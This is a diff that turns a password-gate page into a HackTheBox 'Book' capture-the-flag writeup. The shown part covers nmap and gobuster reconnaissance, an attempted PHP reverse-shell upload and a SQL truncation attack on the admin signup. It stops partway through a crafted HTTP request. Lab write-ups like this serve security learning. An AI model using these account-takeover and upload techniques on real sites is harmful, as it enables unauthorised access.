@@ -1,146 +1,904 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
-    <head>
-        <title>Password Protected</title>
+<html lang="en">
+  <head>
+    <title>
+        Hackthebox - Book Writeup - fmash16&#39;s blog
+      </title>
+        <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport"
+      content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    
+    <meta name="theme-color" content="#000000" />
+    <meta http-equiv="window-target" content="_top" />
+    
+    
+    <meta name="description" content="A medium difficulty linux machine having real world like vulnerability" />
+    <meta name="generator" content="Hugo 0.71.0 with theme pure" />
+    <title>Hackthebox - Book Writeup - fmash16&#39;s blog</title>
+    
+    
+    <link rel="stylesheet" href="https://fmash16.github.io/css/style.min.7da690b0190e15a7d877c45a0c70585e1afa92409e2100ebbdb0fa7ed5ffc0fb.css">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
+    <meta property="og:title" content="Hackthebox - Book Writeup" />
+<meta property="og:description" content="A medium difficulty linux machine having real world like vulnerability" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-book-writeup/" />
+<meta property="og:image" content="https://fmash16.github.io/img/htb_book/card.png" />
+<meta property="og:image" content="https://fmash16.github.io/" />
+<meta property="article:published_time" content="2020-06-04T00:00:00+00:00" />
+<meta property="article:modified_time" content="2020-06-04T00:00:00+00:00" />
 
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <meta name="robots" content="noindex, nofollow">
+<meta itemprop="name" content="Hackthebox - Book Writeup">
+<meta itemprop="description" content="A medium difficulty linux machine having real world like vulnerability">
+<meta itemprop="datePublished" content="2020-06-04T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2020-06-04T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="1292">
+<meta itemprop="image" content="https://fmash16.github.io/img/htb_book/card.png">
+<meta itemprop="image" content="https://fmash16.github.io/">
 
-        <style>
-            *,
-            *:after,
-            *:before {
-                box-sizing: border-box;
-            }
-            body,
-            html {
-                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
-                font-weight: 300;
-                font-size: 16px;
-                background: #262626;
-                color: #f2f2f2;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                min-height: 100%;
-            }
 
-            .protected {
-                background: #202020;
-                -webkit-box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
-                box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
-                border-radius: 3px;
-                min-width: 500px;
 
-            }
-            .protected__content {
-                padding: 24px 28px;
-            }
-            .protected__content__heading {
-                font-size: 16px;
-                font-weight: 500;
-                margin: 0 0 12px;
-                line-height: 1;
-            }
-            .protected__alert {
-                display: none;
-                border-bottom: 1px solid transparent;
-                border-radius: 3px 3px 0 0;
-                padding: 12px 14px;
-                color: #a94442;
-                background-color: #f2dede;
-                border-color: #ebccd1;
-            }
-            .protected__content__input {
-                display: block;
-                border: solid 1px #ccc;
-                padding: 12px 14px;
-                -webkit-box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
-                box-shadow: 0 2px 3px 0 rgba(0,0,0,0.1);
-                font-size: 16px;
-                width: 100%;
-                border-radius: 3px;
+<meta itemprop="keywords" content="sql truncation attack,lfi,xss,dynamic js,dynamic xss,logrotate race condition,sql,linux,real world," /><meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://fmash16.github.io/img/htb_book/card.png"/>
 
-                margin-bottom: 12px;
-            }
-            .protected__content__input:focus {
-                outline: none;
-                border-color: #228843;
-            }
-            .protected__content__btn {
-                background-color: #228843;
-                border-radius: 3px;
-                cursor: pointer;
-                border: none;
-                color: #fff;
-                padding: 12px 14px;
-                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen", "Ubuntu", "Cantarell", "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
-                font-weight: 500;
-                font-size: 16px;
+<meta name="twitter:title" content="Hackthebox - Book Writeup"/>
+<meta name="twitter:description" content="A medium difficulty linux machine having real world like vulnerability"/>
 
-            }
-            .protected__content__btn:hover {
-                background-color: #1C6D36;
-            }
+    <!--[if lte IE 9]>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+      <![endif]-->
 
-        </style>
+    <!--[if lt IE 9]>
+        <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+      <![endif]-->
 
-    </head>
+   
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto&#43;Sans&#43;JP&amp;display=swap" type="text/css" media="all" /> 
+   
 
-    <body>
+  </head>
 
-        <div class="protected">
-            <div class="protected__alert" data-id="alert">You entered the wrong password</div>
-            <div class="protected__content">
-                <h1 class="protected__content__heading">Enter the hash found in the root.txt file to view the writeup</h1>
-                <input class="protected__content__input" data-id="password" type="password" placeholder="password"/>
-                <button data-id="button" type="button" class="protected__content__btn">Continue</button>
+  
+  
+
+  <body class="main-center theme-black" itemscope itemtype="http://schema.org/WebPage"><header class="header" itemscope itemtype="http://schema.org/WPHeader">
+    <div class="slimContent">
+      <div class="navbar-header">
+        <div class="profile-block text-center">
+          <a id="avatar" href="/">
+            <img class="img-circle img-rotate" src="https://fmash16.github.io/avatar.png" width="200" height="200">
+          </a>
+          <h2 id="name" class="hidden-xs hidden-sm">fmash16</h2>
+          <h3 id="title" class="hidden-xs hidden-sm hidden-md">Student</h3>
+          <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i>Dhaka, Bangladesh</small>
+        </div><div class="search" id="search-form-wrap">
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i
+                        class="icon icon-search"></i></button>
+            </span>
+        </div>
+        <div class="ins-search">
+            <div class="ins-search-mask"></div>
+            <div class="ins-search-container">
+                <div class="ins-input-wrapper">
+                    <input type="text" class="ins-search-input" placeholder="Type something..."
+                        x-webkit-speech />
+                    <button type="button" class="close ins-close ins-selectable" data-dismiss="modal"
+                        aria-label="Close"><span aria-hidden="true">×</span></button>
+                </div>
+                <div class="ins-section-wrapper">
+                    <div class="ins-section-container"></div>
+                </div>
             </div>
         </div>
+    </form>
+</div>
 
-        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/js-sha1/0.6.0/sha1.min.js"></script>
-        <script type="text/javascript">
-            "use strict"
-            var button = document.querySelectorAll('[data-id="button"]')
-            var password = document.querySelectorAll('[data-id="password"]')
+        <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+      </div>
+      <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+        <ul class="nav navbar-nav main-nav">
+            <li class="menu-item menu-item-home">
+                <a href="/">
+                    <i class="icon icon-home-fill"></i>
+                  <span class="menu-title">Home</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-archives">
+                <a href="/posts/">
+                    <i class="icon icon-archives-fill"></i>
+                  <span class="menu-title">Posts</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-books">
+                <a href="/categories/">
+                    <i class="icon icon-book-fill"></i>
+                  <span class="menu-title">Writeups</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-tags">
+                <a href="/tags/">
+                    <i class="icon icon-tags"></i>
+                  <span class="menu-title">Tags</span>
+                </a>
+            </li>
+            <li class="menu-item menu-item-about">
+                <a href="/about/">
+                    <i class="icon icon-cup-fill"></i>
+                  <span class="menu-title">About</span>
+                </a>
+            </li>
+        </ul>
+      </nav>
+    </div>
+  </header>
 
-            function login(secret) {
-                var hash = sha1(secret)
-                var url = hash + "/index.html"
-                var alert = document.querySelectorAll('[data-id="alert"]')
+<aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <div class="widget">
+  <h3 class="widget-title"><u> Categories</u></h3>
+    <div class="widget-body">
+        <ul class="category-list">
+            <li class="category-list-item"><a href="https://fmash16.github.io/categories/hackthebox-writeups/" class="category-list-link">hackthebox-writeups</a><span class="category-list-count">8</span></li>
+            <li class="category-list-item"><a href="https://fmash16.github.io/categories/tryhackme-writeups/" class="category-list-link">tryhackme-writeups</a><span class="category-list-count">5</span></li>
+        </ul>
+    </div>
+</div>
+<div class="widget">
+  <h3 class="widget-title"><u> Tags </u></h3>
+    <div class="widget-body">
+        <ul class="tag-list">
+            
+            
+            <a href="https://fmash16.github.io/tags/.net/" class="tag-list-link">.net</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/.netfiddle/" class="tag-list-link">.netfiddle</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ad/" class="tag-list-link">ad</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/adminer/" class="tag-list-link">adminer</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/azure/" class="tag-list-link">azure</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/azure-ad-connect/" class="tag-list-link">azure-ad-connect</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/bludit-cms/" class="tag-list-link">bludit-cms</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/brainfuck/" class="tag-list-link">brainfuck</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/c#/" class="tag-list-link">c#</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/cewl/" class="tag-list-link">cewl</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/command-injection/" class="tag-list-link">command-injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/crackmapexec/" class="tag-list-link">crackmapexec</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/cron/" class="tag-list-link">cron</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/crontab/" class="tag-list-link">crontab</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/cve-2019-14287/" class="tag-list-link">cve-2019-14287</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dll/" class="tag-list-link">dll</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dns/" class="tag-list-link">dns</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dnsadmins/" class="tag-list-link">dnsadmins</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dnspy/" class="tag-list-link">dnspy</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/docker/" class="tag-list-link">docker</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dynamic-js/" class="tag-list-link">dynamic-js</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/dynamic-xss/" class="tag-list-link">dynamic-xss</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/easy/" class="tag-list-link">easy</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/environment-path-hijack/" class="tag-list-link">environment-path-hijack</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/evil-winrm/" class="tag-list-link">evil-winrm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/file-descriptor/" class="tag-list-link">file-descriptor</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ftp/" class="tag-list-link">ftp</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/fuzzing/" class="tag-list-link">fuzzing</a><span class="tag-list-count">5</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ghidra/" class="tag-list-link">ghidra</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/gila-cms/" class="tag-list-link">gila-cms</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/gtfobins/" class="tag-list-link">gtfobins</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/hacking/" class="tag-list-link">hacking</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/hydra/" class="tag-list-link">hydra</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/injection/" class="tag-list-link">injection</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/john/" class="tag-list-link">john</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/kvm/" class="tag-list-link">kvm</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ldap/" class="tag-list-link">ldap</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/ldapsearch/" class="tag-list-link">ldapsearch</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/lfi/" class="tag-list-link">lfi</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/linux/" class="tag-list-link">linux</a><span class="tag-list-count">3</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/linux-file-capabilities/" class="tag-list-link">linux-file-capabilities</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/linux-privesc/" class="tag-list-link">linux-privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/logrotate-race-condition/" class="tag-list-link">logrotate-race-condition</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/mysql/" class="tag-list-link">mysql</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/mysqldump/" class="tag-list-link">mysqldump</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/passthrough/" class="tag-list-link">passthrough</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/php/" class="tag-list-link">php</a><span class="tag-list-count">4</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/powershell/" class="tag-list-link">powershell</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/practice/" class="tag-list-link">practice</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/privesc/" class="tag-list-link">privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/pt_chown/" class="tag-list-link">pt_chown</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/pwn/" class="tag-list-link">pwn</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/python/" class="tag-list-link">python</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/python-path-hijack/" class="tag-list-link">python-path-hijack</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/qemu/" class="tag-list-link">qemu</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/rce/" class="tag-list-link">rce</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/real-world/" class="tag-list-link">real-world</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/rpcclient/" class="tag-list-link">rpcclient</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/smb/" class="tag-list-link">smb</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/smbclient/" class="tag-list-link">smbclient</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/sql/" class="tag-list-link">sql</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/sql-truncation-attack/" class="tag-list-link">sql-truncation-attack</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/stego/" class="tag-list-link">stego</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/subdomain/" class="tag-list-link">subdomain</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/sudo/" class="tag-list-link">sudo</a><span class="tag-list-count">2</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/sudo-privesc/" class="tag-list-link">sudo-privesc</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/tar/" class="tag-list-link">tar</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/vb/" class="tag-list-link">vb</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/virtualization/" class="tag-list-link">virtualization</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/visual-basic/" class="tag-list-link">visual-basic</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/web/" class="tag-list-link">web</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/wfuzz/" class="tag-list-link">wfuzz</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/wildcard/" class="tag-list-link">wildcard</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/windows/" class="tag-list-link">windows</a><span class="tag-list-count">1</span>
+            
+            
+            <a href="https://fmash16.github.io/tags/xss/" class="tag-list-link">xss</a><span class="tag-list-count">1</span>
+            
+        </ul>
 
-                var request = new XMLHttpRequest()
-                request.open('GET', url, true)
+    </div>
+</div>
 
-                request.onload = function () {
-                    if (request.status >= 200 && request.status < 400) {
-                        window.location = url
-                    } else {
-                        parent.location.hash = hash
-                        alert[0].style.display = 'block'
-                        password[0].setAttribute('placeholder', 'Incorrect password')
-                        password[0].value = ''
-                    }
-                }
-                request.onerror = function () {
-                    parent.location.hash = hash
-                    alert[0].style.display = 'block'
-                    password[0].setAttribute('placeholder', 'Incorrect password')
-                    password[0].value = ''
-                }
-                request.send()
+<div class="widget">
+  <h3 class="widget-title"><u> Recent Posts </u></h3>
+    <div class="widget-body">
+        <ul class="recent-post-list list-unstyled no-thumbnail">
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-nest-writeup/" class="title">Hackthebox - Nest Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-06-05 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-05</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-resolute-writeup/" class="title">Hackthebox - Resolute Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-05-28 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-05-28</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-wonderland-writeup/" class="title">TryHackMe - Wonderland Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-06-08 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-08</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-book-writeup/" class="title">Hackthebox - Book Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-06-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-04</time>
+                    </p>
+                </div>
+            </li>
+            <li>
+                <div class="item-inner">
+                    <p class="item-title">
+                        <a href="https://fmash16.github.io/writeups/tryhackme-writeups/tryhackme-cmess-writeup/" class="title">TryHackMe - CMesS Writeup</a>
+                    </p>
+                    <p class="item-date">
+                        <time datetime="2020-06-03 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-03</time>
+                    </p>
+                </div>
+            </li>
+        </ul>
+    </div>
+</div>
+
+  </div>
+</aside>
+
+    
+    
+<aside class="sidebar sidebar-toc collapse" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    <h4 class="toc-title">Table of Contents</h4>
+    <nav id="toc" class="js-toc toc">
+
+    </nav>
+  </div>
+</aside>
+
+<main class="main" role="main"><div class="content">
+  <article id="-" class="article article-type-" itemscope
+    itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      <h3 itemprop="name">
+  <a
+    class="article-title"
+    href="/writeups/hackthebox-writeups/hackthebox-book-writeup/"
+    >Hackthebox - Book Writeup</a
+  >
+</h3>
+
+      <div class="article-meta">
+        
+<span class="article-date">
+  <i class="icon icon-calendar-check"></i>&nbsp;
+<a href="https://fmash16.github.io/writeups/hackthebox-writeups/hackthebox-book-writeup/" class="article-date">
+  <time datetime="2020-06-04 00:00:00 &#43;0000 UTC" itemprop="datePublished">2020-06-04</time>
+</a>
+</span>
+<span class="article-category">
+  <i class="icon icon-folder"></i>&nbsp;
+  <a class="article-category-link" href="/categories/hackthebox-writeups/"> Hackthebox Writeups </a>
+</span>  
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>&nbsp;
+    <a class="article-tag-link" href="/tags/sql-truncation-attack/"> sql truncation attack </a>
+    <a class="article-tag-link" href="/tags/lfi/"> lfi </a>
+    <a class="article-tag-link" href="/tags/xss/"> xss </a>
+    <a class="article-tag-link" href="/tags/dynamic-js/"> dynamic js </a>
+    <a class="article-tag-link" href="/tags/dynamic-xss/"> dynamic xss </a>
+    <a class="article-tag-link" href="/tags/logrotate-race-condition/"> logrotate race condition </a>
+    <a class="article-tag-link" href="/tags/sql/"> sql </a>
+    <a class="article-tag-link" href="/tags/linux/"> linux </a>
+    <a class="article-tag-link" href="/tags/real-world/"> real world </a>
+  </span>
+<br>
+        
+        
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body js-toc-content" itemprop="articleBody">
+      <p><img src="/img/htb_book/card.png" alt=""></p>
+<h1 id="nmap-scan">Nmap Scan</h1>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>nmap -sC -sV -sS -oN nmap.out book.htb
+</code></pre></div><p>Open ports:</p>
+<ul>
+<li>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</li>
+<li>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</li>
+</ul>
+<h1 id="enumeration">Enumeration</h1>
+<h2 id="web">Web</h2>
+<p>Going to the webpage, we find a login prompt. We sign up for an accound and
+login.</p>
+<p><img src="/img/htb_book/1.png" alt=""></p>
+<p><img src="/img/htb_book/2.png" alt=""></p>
+<p>There is a section called &ldquo;Collections&rdquo; where we can submit a book. Seems like
+we can upload a file to the server. We try uploading a php-web-shell and
+succeed. But we dont know the location where the submission is stored yet.</p>
+<p><img src="/img/htb_book/3.png" alt=""></p>
+<p>From the &ldquo;Contact us&rdquo; option, we find the admin email account:</p>
+<blockquote>
+<p><a href="mailto:admin@book.htb">admin@book.htb</a></p>
+</blockquote>
+<h2 id="gobuster-fuzzing">Gobuster fuzzing</h2>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>gobuster dir -u http://book.htb/ -w /usr/share/wordlists/dirb/common.txt
+</code></pre></div><p><img src="/img/htb_book/4.png" alt=""></p>
+<p>We find a folder /doc, which might contain our uploaded file. But we cannot
+access it yet.
+We also see a /admin page.</p>
+<h2 id="doc">/doc</h2>
+<p>Going to the home page of the site after logging in, we find some pdf files
+describing flowers. These can be downloaded and are named in the format <code>1.pdf</code>. From a hunch, we try the url <a href="http://book.htb/1.pdf">http://book.htb/1.pdf</a> and we do in fact get the same pdf file. So the pdf files are stored in the /doc folder.</p>
+<p>So /doc should be where our submissions go. But trying to open our submission
+going to the url <a href="http://book.htb/docs/php-reverse-shell.php">http://book.htb/docs/php-reverse-shell.php</a> shows a 404. So
+either our file was not uploaded or its name was changed.</p>
+<h2 id="admin-login">/admin login</h2>
+<p>Going over to /admin page, we find a login prompt similar to the previous one
+found, but this one shows for authorized people only.</p>
+<p><img src="/img/htb_book/5.png" alt=""></p>
+<p>We try logging in with our created account but fail.(duh!)</p>
+<h2 id="admin-account---sql-truncation-attack">admin account - SQL truncation attack</h2>
+<p>Looking at the source of the signup page, we find something interesting</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#6ab825;font-weight:bold">function</span> validateForm() {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>  <span style="color:#6ab825;font-weight:bold">var</span> x = <span style="color:#24909d">document</span>.forms[<span style="color:#ed9d13">&#34;myForm&#34;</span>][<span style="color:#ed9d13">&#34;name&#34;</span>].value;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>  <span style="color:#6ab825;font-weight:bold">var</span> y = <span style="color:#24909d">document</span>.forms[<span style="color:#ed9d13">&#34;myForm&#34;</span>][<span style="color:#ed9d13">&#34;email&#34;</span>].value;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>  <span style="color:#6ab825;font-weight:bold">if</span> (x == <span style="color:#ed9d13">&#34;&#34;</span>) {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>    alert(<span style="color:#ed9d13">&#34;Please fill name field. Should not be more than 10 characters&#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>  }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>  <span style="color:#6ab825;font-weight:bold">if</span> (y == <span style="color:#ed9d13">&#34;&#34;</span>) {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>    alert(<span style="color:#ed9d13">&#34;Please fill email field. Should not be more than 20 characters&#34;</span>);
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#6ab825;font-weight:bold">false</span>;
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>  }
+</code></pre></div><p>So this script shows that our inputs in the fields should be limited by the set
+number of characters. What if we give a longer input? It will get truncated.
+This is known as <a href="https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html">SQL Truncation Attack</a></p>
+<p>So if we create an account with a name like <code>&quot;admin      hello&quot;</code>, the
+script will truncate all characters after the 10th. And so our name becomes
+admin, and we could run admin on the site. The form must allow spaces in the
+name for this. We check for that and find that we can in fact input spaces.</p>
+<p>Now, we try creating our admin account. The signup page seems to perform a
+client side email validation. To bypass that, we craft our request using burp.
+We intercept a signup request and edit that as per our needs. Our crafted http
+request stands</p>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#447fcf">POST</span> <span style="color:#447fcf;text-decoration:underline">/index.php</span> <span style="color:#6ab825;font-weight:bold">HTTP</span>/<span style="color:#3677a9">1.1</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>Host: book.htb
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
